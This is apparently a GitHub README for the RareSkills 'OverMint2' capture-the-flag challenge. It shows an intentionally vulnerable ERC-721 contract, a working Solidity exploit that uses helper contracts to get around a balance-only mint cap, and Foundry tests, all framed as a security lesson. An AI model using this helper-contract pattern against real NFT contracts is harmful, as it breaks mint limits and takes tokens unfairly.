# OverMint2 Challenge

This repository contains my solution to the RareSkills "OverMint2" challenge, focusing on a different type of NFT security vulnerability.

## The Challenge

The challenge involves bypassing a balance check in an ERC-721 implementation to mint more NFTs than the intended limit:

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract Overmint2 is ERC721 {
    using Address for address;
    uint256 public totalSupply;

    constructor() ERC721("Overmint2", "AT") {}

    function mint() external {
        require(balanceOf(msg.sender) <= 3, "max 3 NFTs");
        totalSupply++;
        _mint(msg.sender, totalSupply);
    }

    function success() external view returns (bool) {
        return balanceOf(msg.sender) == 5;
    }
}
```

## The Vulnerability

Unlike OverMint1, this contract uses `_mint` instead of `_safeMint`, which removes the reentrancy vector since no callbacks are made. However, the vulnerability still exists in the access control mechanism.

The key insight is that the contract only checks the current token balance (`balanceOf(msg.sender)`) rather than tracking how many NFTs each address has minted in total. This means we can:

1. Create multiple addresses (via contract deployment)
2. Have each address mint tokens individually (staying under the limit)
3. Transfer all tokens to a single collector address

## My Solution

I implemented a solution using a factory pattern to deploy multiple helper contracts:

```solidity
contract PwnOvermint2 {
    Overmint2 overmint;
    HelperPwnOvermint2 helperPwnOvermint;

    address i_owner;

    constructor(address _overmint) {
        i_owner = msg.sender;
        overmint = Overmint2(_overmint);
    }

    function attack() external {
        require(i_owner == msg.sender, "You are not the Owner!");

        // Create proxy attackers and have them mint
        for (uint i = 0; i < 5; i++) {
            helperPwnOvermint = new HelperPwnOvermint2(
                address(overmint),
                address(this)
            );
            helperPwnOvermint.mintAndTransfer();
        }
    }
}

contract HelperPwnOvermint2 {
    Overmint2 overmint;
    PwnOvermint2 pwnOvermint;

    constructor(address _overmint, address _pwnOvermint) {
        overmint = Overmint2(_overmint);
        pwnOvermint = PwnOvermint2(_pwnOvermint);
    }

    function mintAndTransfer() external {
        // Mint 1 NFT
        overmint.mint();

        // Transfer to PwnOvermint
        uint256 tokenId = overmint.totalSupply();
        overmint.transferFrom(address(this), address(pwnOvermint), tokenId);
    }
}
```

I also wrote Foundry tests to verify my solution works correctly:

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import {Overmint2, PwnOvermint2} from "../src/Overmint2.sol";
import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "forge-std/console.sol";

contract Overmint2Test is Test {
    Overmint2 overmint;
    PwnOvermint2 pwnovermint;

    address DEPLOYER;
    address ATTACKER;

    function setUp() public {
        DEPLOYER = makeAddr("deployer");
        ATTACKER = makeAddr("attacker");

        vm.prank(DEPLOYER);
        overmint = new Overmint2();
        vm.prank(ATTACKER);
        pwnovermint = new PwnOvermint2(address(overmint));
    }

    function testSetUp() public {
        console.log(
            "Both the Overmint and the Attacker contract have successfully been set up!"
        );
        console.log("");
        console.log("The Overmint contract is at: ", address(overmint));
        console.log("The Attacker contract is at: ", address(pwnovermint));
    }

    function testAttack() public {
        uint256 initialBalance = overmint.balanceOf(address(pwnovermint));
        console.log(
            "Before the attack, the attacker address has a balance of %s NFT's",
            initialBalance
        );
        vm.prank(ATTACKER);
        pwnovermint.attack();
        uint256 newBalance = overmint.balanceOf(address(pwnovermint));
        console.log(
            "After the attack, the attacker address has a balance of %s NFT's",
            newBalance
        );
        vm.prank(address(pwnovermint));
        bool balanceOfAttacker = overmint.success();
        assertTrue(balanceOfAttacker);
    }
}
```

## Testing

The test validates that the attack successfully mints 5 NFTs and transfers them to the main contract, satisfying the `success()` function's requirement:

```bash
forge test -vv --match-test testAttack
```

Running the test shows the balance changing from 0 to 5 NFTs after executing the attack.

## Security Insights

This challenge demonstrates important security considerations:

1. Balance checks are not sufficient for enforcing mint limits
2. Access control should track actions (mints) rather than current states (balances)
3. Using separate counters for minted tokens per address is more secure
4. Contract-based attacks can easily circumvent simplistic balance checks through proxy deployments

## Comparison with OverMint1

Unlike OverMint1 which exploited a reentrancy vulnerability, OverMint2 required a different approach:

- OverMint1: Exploited reentrancy via `_safeMint` callback
- OverMint2: Exploited poor access control via factory pattern deployment

This highlights how different implementations of similar functionality can have completely different vulnerability profiles.

## Acknowledgements

This challenge is part of the RareSkills solidity training material on ERC-721 security issues.